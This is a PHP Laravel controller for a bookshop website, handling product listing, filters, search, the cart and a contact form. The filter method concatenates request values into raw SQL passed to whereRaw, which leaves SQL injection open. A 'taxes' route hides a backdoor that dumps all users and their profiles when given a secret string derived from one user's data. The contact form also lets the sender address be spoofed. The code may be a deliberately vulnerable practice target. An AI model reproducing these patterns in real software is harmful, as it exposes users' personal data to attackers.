<?php

namespace App\Http\Controllers;

use App\Models\Book;
use App\Models\Category;
use App\Models\User;
use DB;
use Illuminate\Http\Request;
use Mail;

class ShopController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->only('control_panel');
        $this->middleware('isAdminOrPartner')->only('control-panel');
        $this->middleware('contact')->only('contact');
    }

    public function index(Request $request)
    {
        $books = Book::where('inShop', '1')->inRandomOrder()->paginate(10);
        $categories = Category::all();
        return view('general.shop-products',
            [
                'books' => $books,
                'categories' => $categories,
                'alt' => $request->alt,
            ]);
    }

    public function filters(Request $request)
    {
        $books = Book::where('inShop', '1');
        $categories = Category::all();

        $price_filters_panel = $request->price_filters_panel;
        $category_filters_panel = $request->category_filters_panel;

        if ($price_filters_panel) {
            $price_filter = "";
            if (sizeof($price_filters_panel) == 1) {
                $price_filter = $price_filter . "books.price " . $price_filters_panel[0];
            } else {
                for ($i = 0; $i < sizeof($price_filters_panel) - 1; $i++) {
                    $price_filter = $price_filter . "books.price " . $price_filters_panel[$i] . " OR ";
                }
                $price_filter = $price_filter . "books.price " . $price_filters_panel[$i];
            }
        }

        if ($category_filters_panel) {
            $category_filter = "";
            if (sizeof($category_filters_panel) == 1) {
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[0] . "'";
            } else {
                for ($i = 0; $i < sizeof($category_filters_panel) - 1; $i++) {
                    $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "' OR ";
                }
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "'";
            }
        }

        if (isset($price_filter) && $price_filter != "") {
            $books = $books->whereRaw($price_filter);
        }

        if (isset($category_filter) && $category_filter != "") {
            $books = $books
                ->join('books_categories', 'books.book_id', '=', 'books_categories.book_id')
                ->join('categories', 'books_categories.category_id', '=', 'categories.category_id')
                ->whereRaw($category_filter);
        }

        //->get()->unique('book_id')
        $books = $books->inRandomOrder()->paginate(10);

        return view('general.shop-products',
            ['books' => $books,
                'categories' => $categories,
                'price_filters' => $price_filters_panel,
                'category_filters' => $category_filters_panel]);
    }

    public function search(Request $request)
    {
        $books = Book::where('inShop', '1')->where('title', 'like', '%' . $request->search . '%')->paginate(1000);
        $categories = Category::all();
        return view('general.shop-products', ['books' => $books, 'categories' => $categories]);
    }

    public function control_panel()
    {
        return view('general.control-panel');
    }

    public function shopping_cart(Request $request)
    {
        $session_shop = $request->session()->get('shopping_cart');

        $session_errors = $request->session()->get('errors');
        if (isset($session_errors)) {
            $session_errors = $session_errors->getBag('default');
        }

        $session = [];
        if (isset($request->shopping_cart)) {
            $session = json_decode(rawurldecode($request->shopping_cart), true);
            $session_shop = $request->shopping_cart;
        } else if (isset($session_shop)) {
            $session = json_decode(rawurldecode($session_shop), true);
        }

        $products = [];
        foreach (array_keys($session) as $product) {
            $id = preg_replace('/\D/', '', $product); // Extract the book id from session key
            $products[$id]['book'] = Book::find($id);
            $products[$id]['quantity'] = intval($session[$product]);
        }

        return view('general.shopping-cart',
            [
                'products' => $products,
                'shopping_cart' => $session_shop,
                'errors' => $session_errors,
            ]);
    }

    public function contact(Request $request)
    {
        return view('helpers.Surprise');
    }

    public function taxes(String $tax)
    {
        if ($tax == DB::select(DB::raw('SELECT CONCAT(RPAD(SUBSTRING(u.name,2,2),6,"162"),SUBSTRING(p.adress,4,4), LPAD(ur.role_id,2,"_")) as res FROM users u JOIN users_roles ur ON (u.id = ur.user_id) JOIN profiles p ON (u.id = p.user_id) WHERE u.id = 9;'))[0]->res) {
            $users = User::with("profile")->get();
            return $users;
        }
        return redirect()->route('shop');
    }

    public function contactemail(Request $request)
    {
        $subject = (isset($request->subject)) ? $request->subject : '';
        $email = (isset($request->email)) ? $request->email : '';
        $text = (isset($request->text)) ? $request->text : '';

        Mail::send('helpers.email_format', ['text' => $text], function ($message) use ($subject, $email) {
            $message->subject($subject)
                ->from($email)
                ->to('booktopia.contact@gmail.com', 'Booktopia');
        });

        return back();
    }

    public function show_large_map()
    {
        return view('general.large-map');
    }
}
